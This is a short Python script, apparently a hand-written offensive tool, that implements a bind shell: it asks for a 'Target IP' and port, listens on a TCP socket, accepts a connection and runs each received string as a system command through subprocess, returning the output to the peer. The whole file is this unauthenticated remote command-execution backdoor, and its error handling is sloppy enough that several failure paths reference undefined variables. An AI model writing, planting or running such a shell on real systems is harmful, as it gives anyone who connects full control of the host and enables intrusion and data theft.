import socket, subprocess , sys , time

class servershell():
  def __init__(self):
    self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  def infost(self):
  
   try: 
    self.ip = input("Target IP: ")
    if not self.ip:
     raise ValueError("IP address cannot be empty.")
   except Exception as error:
      print(error)
      time.sleep(1)
      print("invalid ip address")
      return
   if self.ip:
     try:
      self.port = int(input("Target port: "))

     except Exception as val:
      print("invalid port")
      time.sleep(1)
      print(val)

     self.credentialconnect()


  def credentialconnect(self):
   try:
    self.socket.bind((self.ip,self.port))
   except Exception as e:
    print("error with binding socket")
    time.sleep(1)
    print(e)
   finally:
    try:
     self.socket.listen(1)
     print(f"listening on {self.ip}:{self.port}")
    except Exception:
     print(f"error with listening on:{self.ip}:{self.port}")
    finally:
     self.conn, self.addr = self.socket.accept()
     with self.conn:
      print(f"Connected with {self.addr}")
      while True:
       try:
        self.data = self.conn.recv(1024).decode("latin1",errors="ignore")
       except Exception:
        print("error with receiving data")
       finally:
        try:
         self.resultcmd = subprocess.run(self.data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,errors="ignore")
        except Exception as exc:
         print("error with cmd")
         time.sleep(1)
         print(exc)
        finally:
         self.rst = self.resultcmd.stdout
         self.conn.sendall(self.rst.encode("latin1",errors="ignore"))

if __name__ == "__main__" :

         
  server = servershell()
  server.infost()
     


  
    

     
    

 